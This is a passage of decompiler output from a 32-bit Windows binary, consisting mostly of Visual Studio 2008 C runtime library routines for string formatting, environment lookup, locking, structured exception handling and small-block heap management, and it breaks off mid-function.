void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_00412cbf(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  _sprintf
// 
// Library: Visual Studio 2008 Release

int __cdecl _sprintf(char *_Dest,char *_Format,...)

{
  int *piVar1;
  int iVar2;
  FILE local_24;
  
  if ((_Format == (char *)0x0) || (_Dest == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    local_24._base = _Dest;
    local_24._ptr = _Dest;
    local_24._cnt = 0x7fffffff;
    local_24._flag = 0x42;
    iVar2 = __output_l(&local_24,_Format,(_locale_t)0x0,&stack0x0000000c);
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      __flsbuf(0,&local_24);
    }
    else {
      *local_24._ptr = '\0';
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  _vscan_fn
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl _vscan_fn(undefined *param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  int *piVar1;
  undefined4 uVar2;
  char *unaff_ESI;
  
  _strlen(unaff_ESI);
  if ((unaff_ESI == (char *)0x0) || (param_2 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = (*(code *)param_1)(&stack0xffffffdc,param_2,param_3,param_4);
  }
  return uVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  _sscanf
//  _sscanf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict__sscanf(char *_Src,char *_Format,...)

{
  int iVar1;
  
  iVar1 = _vscan_fn(__input_l,(int)_Format,0,&stack0x0000000c);
  return iVar1;
}



// Library Function - Single Match
//  __getenv_helper_nolock
// 
// Library: Visual Studio 2008 Release

char * __cdecl __getenv_helper_nolock(char *param_1)

{
  int iVar1;
  size_t _MaxCount;
  size_t sVar2;
  uchar **ppuVar3;
  
  if (((DAT_0046fc84 != 0) &&
      ((DAT_0042d0b4 != (uchar **)0x0 ||
       (((DAT_0042d0bc != 0 && (iVar1 = ___wtomb_environ(), iVar1 == 0)) &&
        (DAT_0042d0b4 != (uchar **)0x0)))))) && (ppuVar3 = DAT_0042d0b4, param_1 != (char *)0x0)) {
    _MaxCount = _strlen(param_1);
    for (; *ppuVar3 != (uchar *)0x0; ppuVar3 = ppuVar3 + 1) {
      sVar2 = _strlen((char *)*ppuVar3);
      if (((_MaxCount < sVar2) && ((*ppuVar3)[_MaxCount] == '=')) &&
         (iVar1 = __mbsnbicoll(*ppuVar3,(uchar *)param_1,_MaxCount), iVar1 == 0)) {
        return (char *)(*ppuVar3 + _MaxCount + 1);
      }
    }
  }
  return (char *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _getenv
// 
// Library: Visual Studio 2008 Release

char * __cdecl _getenv(char *_VarName)

{
  int *piVar1;
  size_t sVar2;
  char *pcVar3;
  
  if ((_VarName != (char *)0x0) && (sVar2 = _strnlen(_VarName,0x7fff), sVar2 < 0x7fff)) {
    __lock(7);
    pcVar3 = __getenv_helper_nolock(_VarName);
    FUN_004127f4();
    return pcVar3;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (char *)0x0;
}



void FUN_004127f4(void)

{
  FUN_00412cbf(7);
  return;
}



ulonglong __fastcall FUN_00412800(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_0046ec40 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_0042b0a0 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_0042b0a0);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(int ***)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_004129b8;
        }
        if (0 < iVar2) {
          if ((*param_1 == -0x1f928c9d) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_00425658)
             , BVar3 != 0)) {
            ___DestructExceptionObject(param_1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_0042b0a0);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_00412a7c;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_00412a7c:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_0042b0a0);
  }
LAB_004129b8:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __recalloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl __recalloc(void *_Memory,size_t _Count,size_t _Size)

{
  int *piVar1;
  void *pvVar2;
  uint _NewSize;
  size_t sVar3;
  
  sVar3 = 0;
  if ((_Count == 0) || (_Size <= 0xffffffe0 / _Count)) {
    _NewSize = _Count * _Size;
    if (_Memory != (void *)0x0) {
      sVar3 = __msize(_Memory);
    }
    pvVar2 = _realloc(_Memory,_NewSize);
    if ((pvVar2 != (void *)0x0) && (sVar3 < _NewSize)) {
      _memset((void *)(sVar3 + (int)pvVar2),0,_NewSize - sVar3);
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    pvVar2 = (void *)0x0;
  }
  return pvVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_0042d1f8 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0042d1fc = &stack0x00000004;
  _DAT_0042d138 = 0x10001;
  _DAT_0042d0e0 = 0xc0000409;
  _DAT_0042d0e4 = 1;
  local_32c = DAT_0042b0a0;
  local_328 = DAT_0042b0a4;
  _DAT_0042d0ec = unaff_retaddr;
  _DAT_0042d1c4 = in_GS;
  _DAT_0042d1c8 = in_FS;
  _DAT_0042d1cc = in_ES;
  _DAT_0042d1d0 = in_DS;
  _DAT_0042d1d4 = unaff_EDI;
  _DAT_0042d1d8 = unaff_ESI;
  _DAT_0042d1dc = unaff_EBX;
  _DAT_0042d1e0 = in_EDX;
  _DAT_0042d1e4 = in_ECX;
  _DAT_0042d1e8 = in_EAX;
  _DAT_0042d1ec = unaff_EBP;
  DAT_0042d1f0 = unaff_retaddr;
  _DAT_0042d1f4 = in_CS;
  _DAT_0042d200 = in_SS;
  DAT_0042d130 = IsDebuggerPresent();
  FUN_0041baa6();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_00424eac);
  if (DAT_0042d130 == 0) {
    FUN_0041baa6();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_0042d408;
  do {
    if ((&DAT_0042b344)[iVar2 * 2] == 1) {
      (&DAT_0042b340)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(&DAT_0042b340)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_0042b340)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_0042b340;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x42b460);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_0042b340;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x42b460);
  return;
}



void __cdecl FUN_00412cbf(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_0042b340)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION _Memory;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_0042d55c == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_0042b340 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    _Memory = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (BVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_00412d90();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_00412d90(void)

{
  FUN_00412cbf(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_0042b340)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_0042b340)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_find_block
// 
// Library: Visual Studio 2008 Release

uint __cdecl ___sbh_find_block(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_0046ec4c;
  while( true ) {
    if (DAT_0046ec48 * 0x14 + DAT_0046ec4c <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2008 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_0042d558 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_0046ec5c * 0x8000 + DAT_0042d558[3]),0x8000,0x4000);
        DAT_0042d558[2] = DAT_0042d558[2] | 0x80000000U >> ((byte)DAT_0046ec5c & 0x1f);
        *(undefined4 *)(DAT_0042d558[4] + 0xc4 + DAT_0046ec5c * 4) = 0;
        *(char *)(DAT_0042d558[4] + 0x43) = *(char *)(DAT_0042d558[4] + 0x43) + -1;
        if (*(char *)(DAT_0042d558[4] + 0x43) == '\0') {
          DAT_0042d558[1] = DAT_0042d558[1] & 0xfffffffe;
        }
        if (DAT_0042d558[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_0042d558[3],0,0x8000);
          HeapFree(DAT_0042d55c,0,(LPVOID)DAT_0042d558[4]);
          _memmove(DAT_0042d558,DAT_0042d558 + 5,
                   (DAT_0046ec48 * 0x14 - (int)DAT_0042d558) + -0x14 + DAT_0046ec4c);
          DAT_0046ec48 = DAT_0046ec48 + -1;
          if (DAT_0042d558 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_0046ec54 = DAT_0046ec4c;
        }
      }
      DAT_0042d558 = param_1;
      DAT_0046ec5c = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2008 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_0046ec48 == DAT_0046ec58) {
    pvVar1 = HeapReAlloc(DAT_0042d55c,0,DAT_0046ec4c,(DAT_0046ec58 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_0046ec58 = DAT_0046ec58 + 0x10;
    DAT_0046ec4c = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_0046ec48 * 0x14 + (int)DAT_0046ec4c);
  pvVar1 = HeapAlloc(DAT_0042d55c,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_0046ec48 = DAT_0046ec48 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_0042d55c,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2008 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
